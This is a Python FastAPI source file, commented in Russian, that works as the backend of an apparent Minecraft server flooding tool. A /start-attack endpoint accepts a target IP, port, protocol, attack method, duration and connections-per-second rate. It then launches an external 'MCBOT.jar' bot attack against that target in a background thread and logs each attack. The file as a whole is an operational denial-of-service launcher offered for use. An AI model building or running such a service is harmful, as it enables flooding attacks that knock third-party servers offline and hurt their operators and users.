from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import subprocess
import logging
import time
import os
import signal
import threading

# Настройка логирования
log_dir = "mcbot-main"
log_file = os.path.join(log_dir, "attack_log.txt")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s - %(message)s")
logger = logging.getLogger(__name__)

app = FastAPI()

# Настроим CORS для вашего фронтенда
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Разрешить все домены, для тестирования используйте "*" или укажите конкретный домен
    allow_credentials=True,
    allow_methods=["*"],  # Разрешить все HTTP методы
    allow_headers=["*"],  # Разрешить все заголовки
)

# API-ключ для защиты
API_KEY = "your_secret_api_key"

def verify_api_key(api_key: str):
    if api_key != API_KEY:
        raise HTTPException(status_code=403, detail="Invalid API key")

# Модель запроса
class AttackRequest(BaseModel):
    ip: str  # IP адрес
    port: int  # Порт
    protocol: int  # Версия протокола
    method: str  # Метод атаки
    seconds: int  # Длительность
    target_cps: int  # Соединений в секунду
    api_key: str  # API-ключ

def run_attack(command, seconds):
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate(timeout=seconds)
        
        if process.returncode == 0:
            logger.info(f"Attack completed successfully: {stdout.decode()}")
        else:
            logger.error(f"Error during attack: {stderr.decode()}")
    except subprocess.TimeoutExpired:
        process.terminate()
        logger.error("Attack timed out and was terminated.")
    except Exception as e:
        logger.error(f"Error during attack: {e}")

@app.post("/start-attack")
def start_attack(request: AttackRequest):
    # Проверка API-ключа
    verify_api_key(request.api_key)

    # Формируем команду для запуска атаки
    command = [
        "java", "-jar", "mcbot-main/MCBOT.jar", f"{request.ip}:{request.port}", str(request.protocol), request.method, str(request.seconds), str(request.target_cps)
    ]

    try:
        # Запускаем команду в отдельном потоке
        attack_thread = threading.Thread(target=run_attack, args=(command, request.seconds))
        attack_thread.start()

        logger.info(f"Attack started: {request}")

        return {"status": "Attack started", "details": request.dict()}

    except Exception as e:
        logger.error(f"Error starting attack: {e}")
        raise HTTPException(status_code=500, detail="Failed to start attack")
